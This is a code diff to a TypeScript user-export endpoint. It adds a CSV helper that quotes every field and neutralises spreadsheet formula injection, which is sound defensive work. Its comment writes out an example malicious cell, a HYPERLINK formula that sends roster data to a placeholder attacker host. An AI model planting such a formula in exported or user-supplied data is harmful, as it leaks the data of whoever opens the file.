@@ -4,6 +4,27 @@ import { router, authedProcedure, adminProcedure } from '../init';
 import { buildRecipientWhere, recipientFilterSchema } from '$lib/server/recipients';
 import { logAction, listOrNone, valueOrNone } from '$lib/server/log';
 
+/**
+ * One CSV cell, safe to open in a spreadsheet.
+ *
+ * Two separate problems, both handled here so no export path can forget one:
+ *
+ * Quoting is unconditional. A comma stored in any field — a name, a university —
+ * silently shifts every column after it, and "which fields can contain a comma"
+ * is not a question worth re-answering per column.
+ *
+ * The leading apostrophe is the formula-injection guard. Excel and Sheets treat a
+ * cell opening with `=`, `+`, `-`, or `@` as a formula, so an applicant who names
+ * themselves `=HYPERLINK("https://evil.example?d="&A1,"click")` gets code running
+ * against the roster the moment an admin opens the file. The apostrophe forces
+ * the cell to be read as text and is stripped by the spreadsheet on display.
+ */
+function csvCell(value: string | null | undefined): string {
+	const raw = value ?? '';
+	const neutralized = /^[=+\-@]/.test(raw) ? `'${raw}` : raw;
+	return `"${neutralized.replace(/"/g, '""')}"`;
+}
+
 export const userRouter = router({
 	me: authedProcedure.query(async ({ ctx }) => {
 		return ctx.prisma.user.findUniqueOrThrow({
@@ -182,7 +203,7 @@ export const userRouter = router({
 		const rows = users.map((u) =>
 			[
 				u.uid,
-				`"${u.name.replace(/"/g, '""')}"`,
+				u.name,
 				u.email,
 				u.roles.join('|'),
 				u.status,
@@ -190,7 +211,9 @@ export const userRouter = router({
 				u.activeDecision ?? '',
 				u.teamId ?? '',
 				u.createdAt.toISOString()
-			].join(',')
+			]
+				.map(csvCell)
+				.join(',')
 		);
 
 		return [header, ...rows].join('\n');
